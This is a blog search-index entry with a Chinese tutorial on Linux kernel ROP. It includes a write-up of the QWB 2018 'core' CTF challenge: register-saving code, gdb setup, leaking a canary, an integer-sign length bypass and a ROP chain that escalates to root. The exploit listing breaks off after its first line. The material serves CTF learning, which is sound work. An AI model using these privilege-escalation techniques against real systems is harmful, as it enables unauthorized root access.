<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Kernel初识 - Kernel ROP</title>
      <link href="/posts/16108.html"/>
      <url>/posts/16108.html</url>
      
        <content type="html"><![CDATA[<h1 id="Kernel-ROP"><a href="#Kernel-ROP" class="headerlink" title="Kernel ROP"></a>Kernel ROP</h1><p>ROP 即<code>返回导向编程</code>（Return-oriented programming），应当是大家比较熟悉的一种攻击方式——通过复用代码片段的方式控制程序执行流。</p><p><strong>内核态的 ROP 与用户态的 ROP 一般无二，只不过利用的 gadget 变成了内核中的 gadget，所需要构造执行的 ropchain 由</strong> <code>system(&quot;/bin/sh&quot;)</code> <strong>变为了</strong> <code>commit_creds(&amp;init_cred)</code> 或 <code>commit_creds(prepare_kernel_cred(NULL))</code>，当我们成功地在内核中执行这样的代码后，当前线程的 cred 结构体便变为 init 进程的 cred 的拷贝，我们也就获得了 root 权限，此时在用户态起一个 shell 便能获得 root shell。</p><h2 id="状态保存"><a href="#状态保存" class="headerlink" title="状态保存"></a>状态保存</h2><p>通常情况下，我们的 exploit 需要进入到内核当中完成提权，而我们最终仍然需要<strong>着陆回用户态</strong>以获得一个 root 权限的 shell，因此在我们的 exploit 进入内核态之前我们需要<strong>手动模拟用户态进入内核态的准备工作</strong>——<strong>保存各寄存器的值到内核栈上</strong>，以便于后续着陆回用户态。</p><p>通常情况下使用如下函数保存各寄存器值到我们自己定义的变量中，以便于构造 rop 链：</p><p>算是一个通用的 pwn 板子。</p><p>方便起见，使用了内联汇编，由于编写风格是 Intel 汇编，编译时需要指定参数：<code>-masm=intel</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">size_t user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"></span><br><span class="line">void save_status(void)</span><br><span class="line">&#123;</span><br><span class="line">    asm volatile (</span><br><span class="line">        &quot;mov user_cs, cs;&quot;</span><br><span class="line">        &quot;mov user_ss, ss;&quot;</span><br><span class="line">        &quot;mov user_sp, rsp;&quot;</span><br><span class="line">        &quot;pushf;&quot;</span><br><span class="line">        &quot;pop user_rflags;&quot;</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    puts(&quot;\033[34m\033[1m[*] Status has been saved.\033[0m&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="返回用户态"><a href="#返回用户态" class="headerlink" title="返回用户态"></a>返回用户态</h2><p>由内核态返回用户态只需要：</p><ul><li><code>swapgs</code> 指令恢复用户态 GS 寄存器</li><li><code>sysretq</code> 或者 <code>iretq</code> 恢复到用户空间</li></ul><p>那么我们只需要在内核中找到相应的 gadget 并执行 <code>swapgs;iretq</code> 就可以成功着陆回用户态。</p><p>通常来说，我们应当构造如下 rop 链以返回用户态并获得一个 shell：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">↓   swapgs</span><br><span class="line">0</span><br><span class="line">    iretq</span><br><span class="line">    user_shell_addr</span><br><span class="line">    user_cs</span><br><span class="line">    user_eflags //64bit user_rflags</span><br><span class="line">    user_sp</span><br><span class="line">    user_ss</span><br></pre></td></tr></table></figure><p>需要注意的是，在返回用户态执行 <code>system()</code> 函数时同样有可能遇到栈不平衡导致函数执行失败并最终 Segmentation Fault 的问题，因此在本地调试时若遇到此类问题，则可以将 <code>user_sp</code> 的值加减 <code>8</code> 以进行调整。</p><h2 id="gdb调试"><a href="#gdb调试" class="headerlink" title="gdb调试"></a>gdb调试</h2><p>首先修改init文件，添加以下命令，以便可以获取core.ko的代码段的基址。这样内核启动时就是root权限，当然这是为了调试方便，真正执行exp可以去掉这条命令 。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setsid /bin/cttyhack setuidgid 0 /bin/sh</span><br></pre></td></tr></table></figure><p>然后重新打包文件系统，运行start.sh起内核，在qemu中查找core.ko的.text段的地址：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/ # cat /sys/module/core/sections/.text</span><br><span class="line">0xffffffffc0205000</span><br></pre></td></tr></table></figure><p>在另外一个terminal中启动gdb：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb ./vmlinux -q</span><br></pre></td></tr></table></figure><p>然后添加core.ko的符号表，加载了符号表之后就可以直接对函数名下断点了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ add-symbol-file ./core.ko 0xffffffffc0205000</span><br><span class="line">add symbol table from file &quot;./core.ko&quot; at</span><br><span class="line">  .text_addr = 0xffffffffc0205000</span><br><span class="line">Reading symbols from ./core.ko...(no debugging symbols found)...done.</span><br></pre></td></tr></table></figure><p>然后运行以下命令连接qemu进行调试：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">target remote localhost:1234</span><br></pre></td></tr></table></figure><h2 id="exp编译"><a href="#exp编译" class="headerlink" title="exp编译"></a>exp编译</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc exploit.c -static -masm=intel -g -o exploit</span><br></pre></td></tr></table></figure><h2 id="例题：强网杯-2018-core"><a href="#例题：强网杯-2018-core" class="headerlink" title="例题：强网杯 2018 - core"></a>例题：强网杯 2018 - core</h2><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/SpaceDraG0n-1/images@main/img/20250807184832224.png" alt="image-20250807183616766"></p><p>题目给了我们四个文件分别是 bzImage 、core.cpio 、start.sh 、vmlinux </p><p>core.cpio 是一个打包文件，解包里面有文件系统 ，其中 vmlinux 命名的是内核的二进制文件， 而 core.ko 是存在漏洞的驱动，也就是题目分析的二进制文件 。</p><p>start.sh 是启动脚本 ，标明启动方法、保护措施等。</p><p>bzImage 是镜像文件 </p><p>类比用户态的pwn，.ko 文件就是 binary 文件 ，vmlinux 就是 libc ，不同保护机制是由如何启动来决定的 。</p><p>如果题目中没有提供 vmlinux ，那么我们可以通过<code> ./extract-vmlinux ./bzImage &gt; vmlinux</code> 来从镜像文件中提取 vmlinux 。</p><p>和用户态做题思路一致，我们可以先观察一下程序开启了什么样的保护 </p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/SpaceDraG0n-1/images@main/img/20250807184843577.png" alt="image-20250714121645586"></p><p><code>qemu-system-x86_64 </code> 代表的是模拟 x86_64 架构的计算机系统 。</p><p><code>-m 256M </code> 代表的是内核的运行内存大小分配，其实题目一开始是分配 64M 大小的内存空间，但是我发现启动不了，于是我就把这个调到 256M 了 ，</p><p><code>-kernel ./bzlmage</code> 指定要启动的 Linux 内核镜像文件 。bzImage 属于压缩格式的镜像文件，是 Linux 内核编译后生成的可执行文件。</p><p><code>initrd ./core.cpio</code> 这是用来指定初始化 RAM 磁盘 (initrd) 的文件。initrd 是一个临时的根文件系统 ，在 Linux 内核的早期阶段会被加载。它包含了内核启动所需要的基本驱动程序和工具 。</p><p><code>-append &quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr&quot;</code> 此参数用于向内核传递启动参数</p><ul><li><code>root=/dev/ram</code> 告知内核根文件系统位于 RAM 中，也就是之前通过 <code>-initrd</code> 参数指定的 initrd 。</li><li><code>rw</code>： 将跟文件系统设置为可读写模式 。</li><li><code>console=ttys0</code>：把串口（ttyS0）设置为控制台 ，这样所有输出的信息都会通过串口显示，这在<code>-nographic</code> 模式下尤为重要 。</li><li><code>oops=panic</code>：当系统文件出现严重（oops）时 ，让内核直接进入 panic 状态 。</li><li><code>panic=1</code>：内核进入 panic 状态后 ，1 秒后自动重启系统 。</li><li><code>quiet</code>：开启静默启动模式，只显示关键的启动信息，减少不必要的输出 。</li><li><code>kaslr</code>：启用内核地址空间布局随机化（KASLR），增强系统的安全性 。</li></ul><p><strong>-s</strong></p><p>这个是 <code>-gdb tcp::1234</code> 的简写形式 ，其功能是在 TCP 端口 1234 上开启 GDB 调试服务器 。通过这个服务器，你可以使用 GDB 远程调试内核 。</p><p><code>-netdev user,id=t0 -device e1000,netdev=t0,id=nic0</code></p><p>这部分用于配置虚拟机的网络设备：</p><ul><li><code>-netdev user,id=t0</code>：创建一个用户模式的网络设备，设备 ID 为 t0。这种网络模式提供了简单的网络功能，支持 NAT 转换，能让虚拟机访问外部网络。</li><li><code>-device e1000,netdev=t0,id=nic0</code>：为虚拟机添加一个 e1000 型号的网卡，该网卡连接到之前创建的网络设备 t0，网卡 ID 为 nic0。</li></ul><p><code>-nographic</code></p><p>该参数用于禁用图形输出，让 QEMU 以纯文本模式运行。此时，虚拟机的控制台输出会通过串口（ttyS0）显示在终端上，这对于没有图形界面的系统调试非常实用。</p><p>这些参数有的只要了解一个大概就行了 ，主要我们还是看内核的架构和保护 ，这道题目只开启了 <code>kaslr</code> ,也就是空间地址随机化。</p><p>接下来我们解压打包文件 ，查看文件系统，我之前用 Ubuntu 的时候，双击这个 core.cpio 就可以一键解压这个打包文件了 ，但是我后面换到了 WSL - Ubuntu-22.04 ，也就是子系统Ubuntu，但是它好像不支持这个快捷解压方式 ，所以我只能通过以下一些命令来对这个 core.cpio 进行一个解压：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mkdir core</span><br><span class="line">cd core </span><br><span class="line">mv ../core.cpio core.cpio.gz</span><br><span class="line">gunzip ./core.cpio.gz</span><br><span class="line">cpio -idm &lt; ./core.cpio</span><br></pre></td></tr></table></figure><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/SpaceDraG0n-1/images@main/img/20250807184847836.png" alt="image-20250714125048599"></p><p>这就是解压后的一个文件状态 ，之前说过我们漏洞的主要分析是在这个 core.ko 文件里面的 ，我们先来看一下 init 初始化启动脚本：</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/SpaceDraG0n-1/images@main/img/20250807184849768.png" alt="image-20250714125420323"></p><p>这里面我看得也不是很懂，所以我就直接引用 ctfwiki 里面的原话了：</p><ul><li>第 9 行中把 <code>kallsyms</code> 的内容保存到了 <code>/tmp/kallsyms</code> 中，那么我们就能从 <code>/tmp/kallsyms</code> 中读取 <code>commit_creds</code>，<code>prepare_kernel_cred</code> 的函数的地址了。</li><li>第 10 行把 <code>kptr_restrict</code> 设为 1，这样就不能通过 <code>/proc/kallsyms</code> 查看函数地址了，但第 9 行已经把其中的信息保存到了一个可读的文件中，这句就无关紧要了。</li><li>第 11 行把 <code>dmesg_restrict</code> 设为 1，这样就不能通过 <code>dmesg</code> 查看 kernel 的信息了。</li><li>第 18 行设置了定时关机，为了避免本地做题时产生干扰，我们可以把这句删掉然后重新打包（已经被我删掉了）。</li></ul><p>经过一些前置内核知识的学习 ，由于 kernel pwn 的最终目的是提权到 root ，一种简单方便的方法就是执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">commit_creds(prepare_kernel_cred(0));</span><br></pre></td></tr></table></figure><p>看来这个 <code>proc/kallsyms</code> 中保存了这两个函数的地址 ，虽然后面关闭了 <code>/proc/kallsyms</code> 的读取，但是好在我们的init初始化脚本给我们保存到了 <code>/tmp/kallsyms</code> ，我们后面可以在这里进行一个函数地址的读取 。</p><p>修改完成之后，我们先删除之前的打包文件 core.cpio , 然后我们再次对文件系统进行一个打包 。</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/SpaceDraG0n-1/images@main/img/20250807184854209.png" alt="image-20250714130526337"></p><p>由于题目给了我们一个方便打包的脚本，所以我们可以利用这个快速打包。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rm core.cpio</span><br><span class="line">./gen_cpio.sh core.cpio</span><br></pre></td></tr></table></figure><p>打包好之后我们就可以获得一个新的 core.cpio 文件 ，我们将这个core.cpio文件移到之前的文件夹，然后退出 core 文件夹 ，尝试使用 start.sh 启动脚本对内核进行一个启动。</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/SpaceDraG0n-1/images@main/img/20250807184855820.png" alt="image-20250714131039009"></p><p>这就是启动成功的一个状态，可以看到 vscode 提示我们开启了一个端口 ，就是之前在 start.sh 启动文件设置的 <code>-s</code> ，在 TCP::1234 端口上开启一个 GDB 的远程调试服务器， 我们就可以通过这个端口来调试内核了 。</p><p>exit 退出内核， 我们开始前往 core 文件夹分析 core.ko 的程序漏洞 </p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/SpaceDraG0n-1/images@main/img/20250807184934247.png" alt="image-20250714131514614"></p><p>amd64架构 ，canary保护 ，NX保护 ，我们接着用 IDA 打开这个 core.ko</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/SpaceDraG0n-1/images@main/img/20250807184936729.png" alt="image-20250714142935369"></p><p>init_module 函数创造了 &#x2F;proc&#x2F;core 接口 </p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/SpaceDraG0n-1/images@main/img/20250807184857725.png" alt="image-20250714143020452"></p><p>exit_core 函数删除了 &#x2F;proc&#x2F;core 接口</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/SpaceDraG0n-1/images@main/img/20250807184859253.png" alt="image-20250714143838810"></p><p>交互函数 core_ioctl（）定义了三条命令 ，分别是调用 core_read（），core_copy_func（）和设置全局变量 off ：</p><p>core_read（）：</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/SpaceDraG0n-1/images@main/img/20250807184900774.png" alt="image-20250714143959039"></p><p>从 v5[off] 拷贝 64 个字节到用户空间 ，由于全局变量off是我们可以控制的，所以我们可以合理的控制 <code>off</code> 来 leak canary 和栈上的一些其他数据 。</p><p>core_copy_func（）：</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/SpaceDraG0n-1/images@main/img/20250807184902057.png" alt="image-20250714150656178"></p><p>我们的漏洞主要出现在这里 ，这里从 name 区域复制了a1个字节的数据到v2 ，但是我们这个a1前面有个检查要求小于等于63 ，可是我们通过观察数据类型发现， a1的数据类型由 int64 转化成了 unsigned __int16 ，也就是由有符号转化成无符号数据类型，这个时候，我们就可以让 a1 等于一个小于0的数据，比如说是0xffffffffffff0000|(0x100) ，我们就可以绕过这个检查，实现栈溢出 。</p><p>core_write（）：</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/SpaceDraG0n-1/images@main/img/20250807184939174.png" alt="image-20250714151027661"></p><p>core_write（）向全局变量 name 上写 ，所以我们通过 core_write 和 core_copy_func 函数就可以完成 ROPchain 到内核空间的拷贝和执行 。</p><h3 id="解题思路（来自ctfkiwi的总结）"><a href="#解题思路（来自ctfkiwi的总结）" class="headerlink" title="解题思路（来自ctfkiwi的总结）"></a>解题思路（来自ctfkiwi的总结）</h3><p>经过如上的分析，可以得出以下解题思路：</p><ol><li>通过 ioctl 设置 off，然后通过 core_read() 泄漏出 canary</li><li>通过 core_write() 向 name 写，构造 ropchain</li><li>通过 core_copy_func() 从 name 向局部变量上写，通过设置合理的长度和 canary 进行 rop</li><li>通过 rop 执行 <code>commit_creds(prepare_kernel_cred(NULL))</code> 进行提权</li><li>返回用户态，通过 system(“&#x2F;bin&#x2F;sh”) 等起 shell</li></ol><p>commit_creds（） 和 prepare_kernel_cred（）的地址之前说过可以通过init保存在&#x2F;tmp&#x2F;kallsyms的数据来进行读取，同时我们也可以根据其距离vmlinux的固定偏移来确定 gadgets 的地址 ，其实这里就和用户态linux的题目非常的相似了 。</p><p>我们先在qemu中查看这两个函数的地址 ：</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/SpaceDraG0n-1/images@main/img/20250807184905516.png" alt="image-20250714154407515"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/ $ cat /tmp/kallsyms | grep commit_creds</span><br><span class="line">ffffffff9e09c8e0 T commit_creds</span><br><span class="line">/ $ cat /tmp/kallsyms | grep prepare_kernel_cred</span><br><span class="line">ffffffff9e09cce0 T prepare_kernel_cred</span><br></pre></td></tr></table></figure><p>然后计算这两个函数在 vmlinux 的偏移 ：</p><p>写一个简单的check脚本：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">~/PWN/kernel/kernelROP/QWB2018-core/give_to_player                                 root@SpaceDraG0n 03:47:06 PM</span><br><span class="line">❯ cat check.py   </span><br><span class="line">from pwn import *</span><br><span class="line">elf = ELF(&#x27;./core/vmlinux&#x27;)</span><br><span class="line">print(&quot;commit_creds  &gt;&gt; &quot; + hex(elf.symbols[&#x27;commit_creds&#x27;]-0xffffffff81000000))</span><br><span class="line">print(&quot;prepare_kernel_cred  &gt;&gt;&quot; + hex(elf.symbols[&#x27;prepare_kernel_cred&#x27;]-0xffffffff81000000))</span><br></pre></td></tr></table></figure><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/SpaceDraG0n-1/images@main/img/20250807184907302.png" alt="image-20250714154752358"></p><p>这样我们就可以把函数在 vmlinux 的偏移求出来了 </p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/SpaceDraG0n-1/images@main/img/20250807184908541.png" alt="image-20250714155737487"></p><p>然后我们就可以通过实际函数地址减去得到的偏移，然后就可以知道vmlinux基地址 <code>0xffffffff9e000000</code></p><p>当然我们这个vmlinux地址是会变的，但是我们之所以要求出来，是为了知道栈上其他地址对与vmlinux的固定偏移，知道了这个固定偏移我们就可以通过copy_to_user，把栈上的值减去偏移从而得到vmlinux_base</p><p>然后我们就去 vmlinux 里面找一些 gadget ，这里我们使用 ropper 进行一个提取 ，因为用 ROPgadget 进行提取会比较慢 。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ropper --file ./vmlinux --nocolor &gt; gadget_ropper.txt</span><br></pre></td></tr></table></figure><p>然后可以使用正则表达式寻找我们想要的gadget</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/SpaceDraG0n-1/images@main/img/20250807184909915.png" alt="image-20250719231948241"></p><p>canary的值就是这个 ，然后因为我们赋值了0x40到buf，所以后面的数据也一同复制到了buf，所以我们可以得到core_base 以及 vmlinux_base ，至于固定偏移怎么求，我前面已经讲过了 。</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/SpaceDraG0n-1/images@main/img/20250807184911309.png" alt="image-20250719232832809"></p><p>这里现在验证一下泄露有没有问题，发现没有问题我们就可以进行下一步 rop 的编写了 ，因为我们在内核空间是通过执行 <code>commit_creds(prepare_kernel_cred(NULL))</code> 来提权的，所以我们要准备一个比较特殊的gadget <code>mov rdi,rax;call rdx;</code></p><p>其实就是把<code>prepare_kernel_cred(0)</code> 的返回值放到rdi寄存器里面，然后调用<code>commit_creds</code>函数，但是这里不是直接调用 ，而是通过执行pop_rcx间接调用 ，rop构造如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">int i = 0;</span><br><span class="line">for(i=0;i&lt;10;i++)&#123;</span><br><span class="line">    rop[i] = canary;</span><br><span class="line">&#125;</span><br><span class="line">i = 10;</span><br><span class="line">rop[i++] = pop_rdi; </span><br><span class="line">rop[i++] = 0;</span><br><span class="line">rop[i++] = prepare_kernel_cred;</span><br><span class="line">rop[i++] = pop_rdx;</span><br><span class="line">rop[i++] = pop_rcx;</span><br><span class="line">rop[i++] = mov_rdi_rax_call_rdx;</span><br><span class="line">rop[i++] = commit_creds;</span><br><span class="line">rop[i++] = swapgs; //恢复用户GS寄存器</span><br><span class="line">rop[i++] = 0;</span><br><span class="line">rop[i++] = iretq;</span><br><span class="line">rop[i++] = (size_t)get_shell;</span><br><span class="line">rop[i++] = user_cs;</span><br><span class="line">rop[i++] = user_rflags;</span><br><span class="line">rop[i++] = user_sp;</span><br><span class="line">rop[i++] = user_ss;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">↓   swapgs</span><br><span class="line">    iretq</span><br><span class="line">    user_shell_addr</span><br><span class="line">    user_cs</span><br><span class="line">    user_eflags //64bit user_rflags</span><br><span class="line">    user_sp</span><br><span class="line">    user_ss</span><br></pre></td></tr></table></figure><p>其实就是提权后构造以上的rop链 </p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/SpaceDraG0n-1/images@main/img/20250807184913903.png" alt="image-20250719235642606"></p><p>然后我们可以利用 core_write 函数，把我们构造出来的rop通过copy_from_user函数来复制到name变量里面去，这里的 core_write 函数可以直接调用，不需要我们通过 ioctl 间接调用：</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/SpaceDraG0n-1/images@main/img/20250807184915592.png" alt="image-20250719235923415"></p><p>大概是因为 core_write 函数被定义到 core_fops 这个全局变量里面 ，所以我们可以直接进行调用 </p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/SpaceDraG0n-1/images@main/img/20250807184916645.png" alt="image-20250720000310012"></p><p>然后我们用数据类型引起的overflow，调用core_copy_func函数来布置rop栈溢出就可以实现内核提权了</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/SpaceDraG0n-1/images@main/img/20250807184917985.png" alt="image-20250720002143694"></p><h3 id="EXP："><a href="#EXP：" class="headerlink" title="EXP："></a>EXP：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span 